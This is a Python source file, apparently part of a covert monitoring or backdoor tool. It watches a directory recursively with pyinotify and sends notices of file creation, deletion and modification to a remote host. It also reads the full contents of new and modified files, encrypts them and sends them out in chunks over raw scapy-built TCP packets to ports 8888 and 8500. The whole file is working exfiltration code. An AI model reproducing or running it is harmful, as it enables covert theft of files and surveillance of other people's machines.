import pyinotify
from scapy.all import *
from datetime import datetime
import shutil
import encryption


global host_addr


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_CREATE(self, event):
        if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
            return

        self.send_notif("Created", event.pathname)
        self.send_file(event.pathname, event.name)

    def process_IN_DELETE(self, event):
        if "swp" in event.name:
            return

        self.send_notif("Deleted", event.pathname)

    def process_IN_MODIFY(self, event):
        if event.dir == True:
            return
        
        if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
            return

        self.send_notif("Modified", event.pathname)

    def process_IN_CLOSE_WRITE(self, event):
        if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
            return

        self.send_notif("Modified", event.pathname)
        self.send_file(event.pathname, event.name)

    # def process_IN_CLOSE_NOWRITE(self, event):
    #     if event.dir == True:
    #         return
    
    #     if "swp" in event.name or ".part" in event.name or "+" in event.name or "-" in event.name or ".lock" in event.name or "." in event.name:
    #         return

    #     self.send_notif("Modified", event)
    #     # self.send_file(event.pathname, event.name)
        
    def send_notif(self, action, data):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{current_time}] {action}: {data}"

        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
        encrypted_msg += b"$NOTIF"

        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8888)/encrypted_msg

        send(pkt, verbose=False)

    def send_file(self, path, filename):
        try:
            with open(path) as file:
                data = file.read()
        except:
            return

        encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
        chunks = [encrypted_data[i:i+1000] for i in range(0, len(encrypted_data), 1000)]
        chunks[-1] += b"$EOF" + bytes(filename, encoding="utf-8")

        for chunk in chunks:
            pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk

            send(pkt, verbose=False)
            time.sleep(1)


def start_watchdir(dirname, host_ip):
    global host_addr
    host_addr = host_ip

    watch_manager = pyinotify.WatchManager()
    mask = pyinotify.IN_CREATE | pyinotify.IN_DELETE | pyinotify.IN_MODIFY | pyinotify.IN_CLOSE_WRITE | pyinotify.IN_CLOSE_NOWRITE

    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())
    watch_manager.add_watch(dirname, mask, rec=True)

    notifier.start()
